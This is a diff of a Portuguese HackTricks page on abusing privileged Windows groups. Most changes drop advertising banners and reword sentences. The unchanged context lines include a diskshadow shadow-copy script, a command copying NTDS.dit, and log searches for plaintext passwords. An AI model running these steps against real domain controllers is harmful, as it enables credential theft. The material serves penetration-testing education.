@@ -2,14 +2,7 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="/images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) para construir e **automatizar fluxos de trabalho** facilmente, impulsionados pelas **ferramentas** comunitárias **mais avançadas** do mundo.\
-Obtenha Acesso Hoje:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
-
-## Grupos Conhecidos com Privilégios de Administração
+## Grupos Bem Conhecidos com privilégios de administração
 
 - **Administradores**
 - **Administradores de Domínio**
@@ -17,7 +10,7 @@ Obtenha Acesso Hoje:
 
 ## Operadores de Conta
 
-Este grupo tem o poder de criar contas e grupos que não são administradores no domínio. Além disso, permite o login local no Controlador de Domínio (DC).
+Este grupo tem a capacidade de criar contas e grupos que não são administradores no domínio. Além disso, permite o login local no Controlador de Domínio (DC).
 
 Para identificar os membros deste grupo, o seguinte comando é executado:
 ```powershell
@@ -61,7 +54,7 @@ Este comando revela que `Server Operators` têm acesso total, permitindo a manip
 
 ## Backup Operators
 
-A filiação no grupo `Backup Operators` fornece acesso ao sistema de arquivos `DC01` devido aos privilégios `SeBackup` e `SeRestore`. Esses privilégios permitem a travessia de pastas, listagem e cópia de arquivos, mesmo sem permissões explícitas, usando a flag `FILE_FLAG_BACKUP_SEMANTICS`. É necessário utilizar scripts específicos para este processo.
+A filiação no grupo `Backup Operators` fornece acesso ao sistema de arquivos `DC01` devido aos privilégios `SeBackup` e `SeRestore`. Esses privilégios permitem a travessia de pastas, listagem e capacidades de cópia de arquivos, mesmo sem permissões explícitas, usando a flag `FILE_FLAG_BACKUP_SEMANTICS`. É necessário utilizar scripts específicos para este processo.
 
 Para listar os membros do grupo, execute:
 ```powershell
@@ -92,7 +85,7 @@ O acesso direto ao sistema de arquivos do Controlador de Domínio permite o roub
 
 #### Usando diskshadow.exe
 
-1. Crie uma cópia sombra da unidade `C`:
+1. Crie uma cópia sombra do drive `C`:
 ```cmd
 diskshadow.exe
 set verbose on
@@ -105,7 +98,7 @@ expose %cdrive% F:
 end backup
 exit
 ```
-2. Copie `NTDS.dit` da cópia sombra:
+2. Copie `NTDS.dit` da cópia de sombra:
 ```cmd
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 ```
@@ -181,7 +174,7 @@ Também é viável usar mimilib.dll para execução de comandos, modificando-o p
 DnsAdmins podem manipular registros DNS para realizar ataques Man-in-the-Middle (MitM) criando um registro WPAD após desativar a lista de bloqueio de consultas global. Ferramentas como Responder ou Inveigh podem ser usadas para spoofing e captura de tráfego de rede.
 
 ### Leitores de Log de Eventos
-Membros podem acessar logs de eventos, potencialmente encontrando informações sensíveis, como senhas em texto simples ou detalhes de execução de comandos:
+Membros podem acessar logs de eventos, potencialmente encontrando informações sensíveis, como senhas em texto claro ou detalhes de execução de comandos:
 ```powershell
 # Get members and search logs for sensitive information
 Get-NetGroupMember -Identity "Event Log Readers" -Recurse
@@ -265,11 +258,5 @@ Get-NetGroupMember -Identity "Server Operators" -Recurse
 - [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
 - [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
 
-<figure><img src="/images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) para construir e **automatizar fluxos de trabalho** facilmente com as **ferramentas** da comunidade **mais avançadas** do mundo.\
-Obtenha Acesso Hoje:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
 
 {{#include ../../banners/hacktricks-training.md}}
